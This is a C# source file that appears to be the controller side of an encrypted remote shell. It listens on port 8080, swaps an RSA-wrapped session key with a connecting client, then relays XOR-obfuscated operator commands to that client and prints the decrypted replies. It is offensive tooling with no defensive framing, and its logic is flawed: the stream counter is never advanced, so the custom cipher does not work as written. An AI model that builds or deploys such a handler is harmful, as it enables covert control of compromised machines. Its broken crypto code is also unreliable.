// See https://aka.ms/new-console-template for more information
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Net.Sockets;
using System.Security.Cryptography;

public class Program
{
    protected static byte[] keys;
    protected static long cur = 0;
    protected static void copycmdln(NetworkStream ns)
    {
        bool _ = true;
        while(_)
        {
            try
            {
                byte[] b = new byte[4096];
                int bytes = ns.Read(b, 0, b.Length);

                for(int i = 0; i < bytes; i++)
                {
                    if(cur % keys.Length == 0)
                    {
                        keys = SHA256.Create().ComputeHash(keys);
                    }
                    b[i] ^= keys[cur % keys.Length];
                }
                Console.OpenStandardOutput().Write(b, 0, bytes);
                Thread.Sleep(50);
            }
            catch
            {
                _ = false;
            }

        }
    }
    public static void Main(string[] args)
    {
        TcpListener listener = new TcpListener(IPAddress.Any, 8080);
        listener.Start();
        Console.WriteLine("[*] Server Start.");
        TcpClient cli = listener.AcceptTcpClient();
        NetworkStream sm01 = cli.GetStream();
        byte[] data = new byte[512];
        int bytes = sm01.Read(data, 0, data.Length);
        RSA rsa = RSA.Create(2048);
        rsa.KeySize = 2048;
        rsa.ImportRSAPublicKey(data, out bytes);
        //rsa.FromXmlString(Encoding.ASCII.GetString(data, 0, bytes));
        keys = new byte[rsa.KeySize / 12];
        for(int i = 0; i < rsa.KeySize / 12; i++)
        {
            keys[i] = Convert.ToByte(new Random().Next(0, 256));
        }
        data = rsa.Encrypt(keys, RSAEncryptionPadding.Pkcs1);
        sm01.Write(data);
        keys = SHA256.Create().ComputeHash(keys);
        Console.WriteLine(Convert.ToBase64String(keys));
        while (true)
        {
            Task.Run(() => copycmdln(sm01));
            

            if (sm01.CanWrite)
            {
                char[] cmds = Console.ReadLine().ToCharArray();
                byte[] cmd = Encoding.ASCII.GetBytes(cmds, 0, cmds.Length);
                for(int i = 0; i < cmd.Length; i++)
                {
                    if(cur % keys.Length == 0)
                    {
                        keys = SHA256.Create().ComputeHash(keys);
                    }
                    cmd[i] ^= keys[cur % keys.Length];
                }
                sm01.Write(cmd, 0, cmd.Length);
            }
        }
    }
}